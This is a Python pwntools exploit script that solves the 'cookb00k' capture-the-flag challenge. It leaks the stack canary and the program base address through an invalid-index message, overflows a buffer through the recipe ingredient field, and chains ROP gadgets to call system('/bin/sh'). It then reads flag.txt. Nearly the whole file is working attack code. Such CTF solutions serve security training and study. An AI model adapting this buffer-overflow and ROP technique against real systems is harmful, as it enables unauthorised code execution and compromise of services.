#!/bin/env python3

from pwn import *
import logging
import os
logging.disable()

exe = context.binary = ELF('./cookb00k')

HOST = os.environ.get("HOST", "cookb00k.challs.srdnlen.it")
PORT = int(os.environ.get("PORT", 15004))

with connect(HOST, PORT) as io:
    def bof(payload):
        io.sendline(b'2')        	   	# add recipe
        io.sendline(b'just a name')		# name
        io.sendline(b'1')               # difficulty
        io.sendline(b'1')               # rating
        io.sendline(b'1')               # cooking time
        io.sendline(b'1')               # salt amount
        # fill the linked list and overflow the local buffer
        io.sendline(b'a'*511)           # ingredient #1 (padding)
        io.sendline(b'a'*511)           # ingredient #2 (padding)
        io.sendline(b'a'*7)             # ingredient #3 (padding)
        # ingredient #4 [buffer overflowing starts here]
        io.sendline(canary + payload)
        io.sendline(b'')            	# stop adding ingredients

    def leak_canary():
        global canary

        io.sendline(b'5') 				# view recipe
        # padding to overflow the canary 0x00 byte and not get NULL terminated on print
        io.sendline(b'a'*8)
        io.recvuntil(b'You provided an invalid index value:\n0'+b'a'*8)
        leak = io.recvline()
        # add the NULL terminating 0x00 to the canary we have previously overwritten
        leak = bytes([0]) + leak
        canary = bytes(leak[:8])		# take canary only

        # put the NULL terminating 0x00 of the canary back to its place to avoid stack smashing detection
        io.sendline(b'a'*7+b'\x00')
        io.sendline(b'1')				# recipe #1 and keep going
        io.recvrepeat(timeout=.5) 		# clean receive buffer

    def leak_pie():
        io.sendline(b'a'*7)				# only 7 padding bytes needed
        io.recvuntil(b'You provided an invalid index value:\n0'+b'a'*7)
        leak = io.recvline()
        func_addr = int.from_bytes(leak[:6], 'little')

        # subtract offset of function we got the pointer to (view_recipes) to get module base address
        pie = func_addr - 0x1BCF

        exe.address = pie
        io.recvrepeat(timeout=.5) 		# clean receive buffer

    leak_pie()
    leak_canary()

    rop = ROP(exe)

    bin_sh = next(exe.search(b'/bin/sh\0'))
    system_func = exe.symbols['plt.system']

    rop.raw(b'a'*24)					# padding
    rop.raw(p64(rop.ret.address))		# ret; gadget
    rop.raw(p64(rop.rdi.address))		# pop rdi; ret; gadget
    rop.raw(p64(bin_sh))				# put ptr to "/bin/sh\0" string on the stack
    # call system() with "/bin/sh\0" as parameter to get shell
    rop.raw(p64(system_func))

    bof(rop.chain())

    io.sendline(b'ls')
    io.sendline(b'cat flag.txt')
    io.recvuntil(b'srdnlen{')
    flag = b'srdnlen{' + io.recvuntil(b'}')

flag = flag.decode()
print(flag)
